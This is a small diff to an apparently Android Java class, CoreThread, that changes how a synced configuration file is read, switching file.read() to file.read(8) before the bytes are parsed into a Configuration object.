@@ -245,7 +245,7 @@ public class CoreThread extends Activity implements Runnable {
 		// tries to load the file got from the sync, if any.
 		AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
 		if (file.exists()) {
-			byte[] resource = file.read();
+			byte[] resource = file.read(8);
 			// Initialize the configuration object
 			Configuration conf = new Configuration(resource);
 			// Load the configuration
